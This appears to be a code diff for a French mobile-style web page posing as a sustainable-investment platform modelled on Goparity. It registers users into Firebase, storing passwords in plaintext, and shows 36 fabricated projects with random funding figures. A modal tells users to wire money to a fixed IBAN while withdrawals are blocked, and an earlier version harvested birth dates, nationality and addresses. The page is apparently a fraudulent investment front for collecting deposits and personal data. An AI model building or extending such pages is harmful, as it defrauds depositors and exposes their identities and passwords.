@@ -3,134 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Investissement & Avenir | Inscription</title>
+    <title>Investissement & Avenir</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
+        body { background-color: #f4f7f6; color: #333; font-family: 'Segoe UI', sans-serif; margin: 0; }
+        .dark-bg { background-color: #000; color: #fff; }
         .gold-btn { background: linear-gradient(135deg, #d4af37 0%, #f1d592 100%); color: #000; font-weight: 800; }
-        .step-page { display: none; min-height: 100vh; flex-direction: column; padding: 25px; animation: fadeIn 0.3s ease; }
+        .step-page { display: none; min-height: 100vh; flex-direction: column; animation: fadeIn 0.3s ease; }
         .active { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
-        input { background: #111!important; border: 1px solid #333!important; color: white!important; border-radius: 15px!important; padding: 18px!important; width: 100%; margin-bottom: 12px; outline: none; }
-        .country-item { display: flex; align-items: center; padding: 16px; border-bottom: 1px solid #222; cursor: pointer; }
-        
-        /* Style Interface Type Goparity */
-        .goparity-bg { background-color: #f4f7f6; color: #333; }
-        .card-impact { background: #fff; border-radius: 20px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .nav-bar { background: white; border-top: 1px solid #eee; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 10px 0; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #999; }
-        .nav-item.active { color: #d4af37; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        input { background: #fff; border: 1px solid #ddd; border-radius: 12px; padding: 15px; width: 100%; margin-bottom: 10px; outline: none; color: #000; }
+        .card-project { background: white; border-radius: 20px; overflow: hidden; margin-bottom: 20px; border: 1px solid #eee; }
+        .nav-bar { background: white; border-top: 1px solid #eee; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 200; align-items: center; justify-content: center; padding: 20px; }
     </style>
 </head>
 <body>
 
 <div id="app">
-    <div id="page-welcome" class="step-page active items-center justify-center text-center">
+    <div id="page-welcome" class="step-page active dark-bg items-center justify-center p-6 text-center">
         <h1 class="text-3xl font-black mb-12 text-yellow-500 italic">Investissement <br>& Avenir</h1>
         <button onclick="goTo('page-phone')" class="gold-btn w-full py-5 rounded-2xl mb-4 uppercase">Ouvrir un compte</button>
-        <button class="w-full py-5 rounded-2xl border border-white/20 uppercase font-bold text-sm">Se connecter</button>
+        <button onclick="goTo('page-login')" class="w-full py-5 rounded-2xl border border-white/20 uppercase font-bold text-sm">Se connecter</button>
     </div>
 
-    <div id="page-phone" class="step-page">
-        <h2 class="text-2xl font-black mb-2 text-yellow-500">Votre numéro</h2>
-        <p class="text-gray-500 mb-8 text-sm">Pour sécuriser votre compte via SMS.</p>
-        <input type="tel" id="reg-phone" placeholder="Numéro de téléphone (+33...)">
-        <button onclick="goTo('page-access')" class="gold-btn w-full py-5 rounded-2xl mt-auto uppercase">Suivant</button>
+    <div id="page-login" class="step-page dark-bg p-8">
+        <h2 class="text-2xl font-black mb-6 text-yellow-500">Connexion</h2>
+        <input type="email" id="login-email" placeholder="Email">
+        <input type="password" id="login-pass" placeholder="Mot de passe">
+        <button onclick="loginUser()" class="gold-btn w-full py-5 rounded-2xl mt-4 uppercase">Entrer</button>
+        <p onclick="goTo('page-welcome')" class="text-center mt-6 text-gray-500 text-sm">Retour</p>
     </div>
 
-    <div id="page-access" class="step-page">
-        <h2 class="text-2xl font-black mb-2 text-yellow-500">Créer vos accès</h2>
-        <p class="text-gray-500 mb-8 text-sm">Ces informations vous permettront de vous connecter sur n'importe quel appareil.</p>
-        <input type="email" id="reg-email" placeholder="Adresse E-mail">
-        <input type="password" id="reg-pass" placeholder="Créer un mot de passe">
-        <button onclick="goTo('page-identity')" class="gold-btn w-full py-5 rounded-2xl mt-auto uppercase">Continuer</button>
+    <div id="page-phone" class="step-page dark-bg p-8">
+        <h2 class="text-2xl font-black mb-6 text-yellow-500">Inscription</h2>
+        <input type="tel" id="reg-phone" placeholder="Téléphone">
+        <input type="email" id="reg-email" placeholder="Email">
+        <input type="password" id="reg-pass" placeholder="Mot de passe">
+        <input type="text" id="reg-nom" placeholder="Nom complet">
+        <button onclick="finalRegister()" class="gold-btn w-full py-5 rounded-2xl mt-auto uppercase">Créer mon compte</button>
     </div>
 
-    <div id="page-identity" class="step-page">
-        <h2 class="text-2xl font-black mb-6 text-yellow-500">Identité</h2>
-        <input type="text" id="reg-nom" placeholder="Nom">
-        <input type="text" id="reg-prenom" placeholder="Prénom">
-        <input type="text" id="reg-nat" placeholder="Nationalité">
-        <input type="date" id="reg-dob" placeholder="Date de naissance">
-        <input type="text" id="reg-pob" placeholder="Lieu de naissance">
-        <button onclick="goTo('page-country')" class="gold-btn w-full py-5 rounded-2xl mt-auto uppercase">Suivant</button>
-    </div>
-
-    <div id="page-country" class="step-page">
-        <h2 class="text-2xl font-black mb-4 text-yellow-500">Pays de résidence</h2>
-        <input type="text" id="country-search" onkeyup="filterCountries()" placeholder="Rechercher un pays...">
-        <div id="country-list" class="overflow-y-auto max-h-[400px] bg-[#111] rounded-2xl"></div>
-        <input type="hidden" id="selected-country">
-    </div>
-
-    <div id="page-address" class="step-page">
-        <h2 class="text-2xl font-black mb-6 text-yellow-500">Adresse de résidence</h2>
-        <input type="text" id="reg-num-rue" placeholder="Numéro de rue">
-        <input type="text" id="reg-nom-rue" placeholder="Nom de la rue">
-        <input type="text" id="reg-ville" placeholder="Ville">
-        <input type="text" id="reg-cp" placeholder="Code Postal">
-        <button onclick="finalRegister()" id="btn-finish" class="gold-btn w-full py-5 rounded-2xl mt-auto uppercase">Ouvrir mon compte</button>
-    </div>
-
-    <div id="page-dashboard" class="step-page goparity-bg !p-0">
-        <div class="p-6 bg-white flex justify-between items-center">
-            <div>
-                <p class="text-xs text-gray-400 font-bold uppercase">Portefeuille de</p>
-                <h3 id="user-display" class="font-black text-lg">---</h3>
-            </div>
-            <div class="w-10 h-10 bg-yellow-100 rounded-full flex items-center justify-center text-yellow-600 font-bold">
-                <i class="fa-solid fa-user"></i>
-            </div>
+    <div id="page-dashboard" class="step-page !pb-24">
+        <div class="p-6 bg-white flex justify-between items-center shadow-sm">
+            <h3 class="font-black text-lg italic text-yellow-600">Invest & Avenir</h3>
+            <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center"><i class="fa-solid fa-user"></i></div>
         </div>
 
         <div class="p-6">
-            <div class="bg-[#1a2b3c] p-6 rounded-[30px] text-white shadow-xl">
-                <p class="text-[10px] uppercase font-bold text-gray-400">Solde total</p>
+            <div class="bg-[#1a2b3c] p-8 rounded-[35px] text-white shadow-xl mb-8">
+                <p class="text-[10px] uppercase font-bold text-gray-400">Solde disponible</p>
                 <h2 class="text-4xl font-black mt-1">0,00 €</h2>
-                <div class="mt-6 flex gap-3">
-                    <button class="bg-white text-black px-6 py-3 rounded-xl font-bold text-sm flex-1">+ AJOUTER</button>
-                    <button class="bg-white/10 text-white px-3 py-3 rounded-xl"><i class="fa-solid fa-ellipsis"></i></button>
+                <div class="mt-8 flex gap-3">
+                    <button onclick="showModal('modal-recharge')" class="bg-white text-black px-6 py-4 rounded-2xl font-black text-xs flex-1 uppercase">Recharger</button>
+                    <button onclick="alert('Retrait disponible après validation')" class="bg-white/10 text-white px-6 py-4 rounded-2xl font-black text-xs flex-1 uppercase">Retrait</button>
                 </div>
             </div>
 
-            <div class="mt-6 card-impact flex items-center justify-between">
-                <div>
-                    <p class="text-xs font-bold text-gray-400 uppercase">Impact durable</p>
-                    <p class="font-black text-sm mt-1">Commencez à investir</p>
-                </div>
-                <img src="https://cdn-icons-png.flaticon.com/512/628/628283.png" class="w-12 opacity-20">
-            </div>
-
-            <div class="mt-4 card-impact">
-                <div class="flex justify-between border-b pb-3 mb-3">
-                    <span class="text-xs text-gray-500">Bénéficiaire</span>
-                    <span id="iban-name" class="text-xs font-bold">---</span>
-                </div>
-                <div class="flex justify-between border-b pb-3 mb-3">
-                    <span class="text-xs text-gray-500">IBAN</span>
-                    <span class="text-xs font-bold">FR76 **** 6911</span>
-                </div>
-                <div class="flex justify-between">
-                    <span class="text-xs text-gray-500">Pays</span>
-                    <span id="iban-country" class="text-xs font-bold">---</span>
-                </div>
-            </div>
+            <h4 class="font-black text-xl mb-6 flex items-center gap-2">
+                <i class="fa-solid fa-leaf text-green-500"></i> Projets Durables
+            </h4>
+            
+            <div id="projects-container"></div>
         </div>
 
         <div class="nav-bar">
-            <div class="nav-item active"><i class="fa-solid fa-house mb-1"></i>Accueil</div>
-            <div class="nav-item"><i class="fa-solid fa-chart-line mb-1"></i>Investir</div>
-            <div class="nav-item"><i class="fa-solid fa-layer-group mb-1"></i>Prêts</div>
-            <div class="nav-item"><i class="fa-solid fa-leaf mb-1"></i>Impact</div>
-            <div class="nav-item"><i class="fa-solid fa-user mb-1"></i>Profil</div>
+            <div class="nav-item active text-yellow-600 flex flex-col items-center"><i class="fa-solid fa-house mb-1"></i><span class="text-[10px]">Accueil</span></div>
+            <div class="nav-item text-gray-400 flex flex-col items-center"><i class="fa-solid fa-chart-pie mb-1"></i><span class="text-[10px]">Portefeuille</span></div>
+            <div class="nav-item text-gray-400 flex flex-col items-center"><i class="fa-solid fa-gear mb-1"></i><span class="text-[10px]">Réglages</span></div>
+        </div>
+    </div>
+
+    <div id="modal-recharge" class="modal">
+        <div class="bg-white w-full rounded-[30px] p-8 max-w-sm">
+            <h3 class="text-xl font-black mb-4">Recharger par virement</h3>
+            <p class="text-sm text-gray-500 mb-6">Effectuez un virement vers ce RIB pour créditer votre solde immédiatement.</p>
+            
+            <div class="bg-gray-50 p-4 rounded-2xl mb-4 border border-dashed border-gray-300">
+                <p class="text-[10px] font-bold text-gray-400 uppercase">Bénéficiaire</p>
+                <p class="font-bold mb-3">INVEST & AVENIR LTD</p>
+                
+                <p class="text-[10px] font-bold text-gray-400 uppercase">IBAN</p>
+                <p class="font-mono text-sm mb-3">FR76 3000 6000 0123 4567 8901 234</p>
+                
+                <p class="text-[10px] font-bold text-gray-400 uppercase">BIC / SWIFT</p>
+                <p class="font-mono text-sm">MPAYFRP1XXX</p>
+            </div>
+
+            <button onclick="hideModal('modal-recharge')" class="w-full py-4 bg-black text-white rounded-2xl font-bold">J'ai fait le virement</button>
+            <button onclick="hideModal('modal-recharge')" class="w-full mt-2 py-4 text-gray-400 font-bold">Fermer</button>
         </div>
     </div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    import { getFirestore, doc, setDoc, getDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyD1Yhvo8ooS9nTb_RRP7Pswjqovj2T6ZOU",
@@ -144,67 +113,75 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    const countries = [
-        {name: "France", flag: "🇫🇷"}, {name: "Belgique", flag: "🇧🇪"}, {name: "Suisse", flag: "🇨🇭"},
-        {name: "Luxembourg", flag: "🇱🇺"}, {name: "Allemagne", flag: "🇩🇪"}, {name: "Maroc", flag: "🇲🇦"},
-        {name: "Portugal", flag: "🇵🇹"}, {name: "Espagne", flag: "🇪🇸"}, {name: "Italie", flag: "🇮🇹"}
-    ];
-
     window.goTo = (id) => {
         document.querySelectorAll('.step-page').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        if(id === 'page-country') renderCountries();
+        if(id === 'page-dashboard') renderProjects();
     };
 
-    window.renderCountries = (filter = "") => {
-        const list = document.getElementById('country-list');
-        list.innerHTML = "";
-        countries.filter(c => c.name.toLowerCase().includes(filter.toLowerCase())).forEach(c => {
-            const div = document.createElement('div');
-            div.className = "country-item";
-            div.innerHTML = `<span class="mr-4 text-xl">${c.flag}</span> <span class="font-bold">${c.name}</span>`;
-            div.onclick = () => {
-                document.getElementById('selected-country').value = c.name;
-                goTo('page-address');
-            };
-            list.appendChild(div);
-        });
+    window.showModal = (id) => document.getElementById(id).style.display = 'flex';
+    window.hideModal = (id) => document.getElementById(id).style.display = 'none';
+
+    // FONCTION CONNEXION
+    window.loginUser = async () => {
+        const email = document.getElementById('login-email').value;
+        const pass = document.getElementById('login-pass').value;
+        if(!email || !pass) return alert("Remplissez les champs");
+
+        const q = query(collection(db, "users"), where("email", "==", email), where("pass", "==", pass));
+        const querySnapshot = await getDocs(q);
+
+        if (!querySnapshot.empty) {
+            goTo('page-dashboard');
+        } else {
+            alert("Email ou mot de passe incorrect");
+        }
     };
 
-    window.filterCountries = () => renderCountries(document.getElementById('country-search').value);
-
+    // INSCRIPTION SANS SMS
     window.finalRegister = async () => {
-        const btn = document.getElementById('btn-finish');
-        btn.innerText = "OUVERTURE DU COMPTE...";
-
-        const userData = {
+        const data = {
             tel: document.getElementById('reg-phone').value,
             email: document.getElementById('reg-email').value,
             pass: document.getElementById('reg-pass').value,
             nom: document.getElementById('reg-nom').value,
-            prenom: document.getElementById('reg-prenom').value,
-            nationalite: document.getElementById('reg-nat').value,
-            dob: document.getElementById('reg-dob').value,
-            pob: document.getElementById('reg-pob').value,
-            pays: document.getElementById('selected-country').value,
-            adresse: `${document.getElementById('reg-num-rue').value} ${document.getElementById('reg-nom-rue').value}, ${document.getElementById('reg-ville').value}`,
-            code_postal: document.getElementById('reg-cp').value,
-            date_creation: new Date().toISOString()
+            balance: "0,00"
         };
-
         try {
-            const userId = "inv_" + Date.now();
-            await setDoc(doc(db, "users", userId), userData);
-            
-            // Mise à jour de l'interface Dashboard
-            document.getElementById('user-display').innerText = userData.prenom + " " + userData.nom;
-            document.getElementById('iban-name').innerText = userData.prenom + " " + userData.nom;
-            document.getElementById('iban-country').innerText = userData.pays;
-            
+            await setDoc(doc(db, "users", "u_" + Date.now()), data);
             goTo('page-dashboard');
-        } catch (e) {
-            alert("Erreur : " + e.message);
-            btn.innerText = "OUVRIR MON COMPTE";
+        } catch (e) { alert(e.message); }
+    };
+
+    // GÉNÉRATION DE 35+ PROJET TYPE GOPARITY
+    window.renderProjects = () => {
+        const container = document.getElementById('projects-container');
+        container.innerHTML = "";
+        const types = ["Solaire", "Éolien", "Forêt", "Hydraulique"];
+        
+        for(let i=1; i<=36; i++) {
+            const type = types[i % 4];
+            const progress = Math.floor(Math.random() * 60) + 20;
+            const card = `
+                <div class="card-project">
+                    <img src="https://source.unsplash.com/random/400x200?${type},nature&sig=${i}" class="w-full h-40 object-cover">
+                    <div class="p-5">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-[10px] font-black px-3 py-1 bg-green-100 text-green-700 rounded-full uppercase">${type}</span>
+                            <span class="text-xs font-bold text-gray-400">Il reste ${Math.floor(Math.random()*20)} jours</span>
+                        </div>
+                        <h5 class="font-black text-lg mb-4">Projet Durable #${i} - Europe</h5>
+                        <div class="w-full bg-gray-100 h-2 rounded-full mb-2">
+                            <div class="bg-green-500 h-2 rounded-full" style="width: ${progress}%"></div>
+                        </div>
+                        <div class="flex justify-between text-[11px] font-bold">
+                            <span class="text-green-600">${progress}% financé</span>
+                            <span>Objectif: 500 000€</span>
+                        </div>
+                    </div>
+                </div>
+            `;
+            container.innerHTML += card;
         }
     };
 </script>
